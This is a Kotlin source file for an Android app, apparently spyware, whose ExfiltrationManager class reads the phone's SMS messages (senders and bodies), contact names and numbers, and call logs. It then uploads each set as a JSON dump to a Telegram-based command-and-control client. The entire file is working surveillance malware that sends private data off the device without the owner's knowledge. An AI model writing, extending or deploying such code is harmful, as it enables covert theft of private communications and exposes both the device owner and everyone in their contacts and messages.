package com.mzkyzak.appbug

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

class ExfiltrationManager(private val context: Context, private val c2Client: TelegramC2Client) {

    fun runFullExfiltration() {
        try {
            scanSms()
            scanContacts()
            scanCallLogs()
        } catch (e: Exception) {
            c2Client.sendMessage("<b>[Exfil]</b> Error during full scan: ${e.message}")
        }
    }

    private fun scanSms() {
        val smsList = JSONArray()
        context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC")?.use {
            val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
            var count = 0
            while (it.moveToNext() && count < 100) {
                smsList.put(JSONObject().apply {
                    put("address", it.getString(addressIndex))
                    put("body", it.getString(bodyIndex))
                })
                count++
            }
        }
        if (smsList.length() > 0) c2Client.sendTextDocument("sms_dump_${System.currentTimeMillis()}.json", smsList.toString(2))
    }

    private fun scanContacts() {
        val contactsList = JSONArray()
        context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            var count = 0
            while (it.moveToNext() && count < 200) {
                contactsList.put(JSONObject().apply {
                    put("name", it.getString(nameIndex))
                    put("number", it.getString(numberIndex))
                })
                count++
            }
        }
        if (contactsList.length() > 0) c2Client.sendTextDocument("contacts_dump_${System.currentTimeMillis()}.json", contactsList.toString(2))
    }

    private fun scanCallLogs() {
        val callList = JSONArray()
        context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC")?.use {
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            var count = 0
            while (it.moveToNext() && count < 50) {
                callList.put(JSONObject().apply {
                    put("number", it.getString(numberIndex))
                    put("type", it.getInt(typeIndex))
                })
                count++
            }
        }
        if (callList.length() > 0) c2Client.sendTextDocument("calls_dump_${System.currentTimeMillis()}.json", callList.toString(2))
    }
}
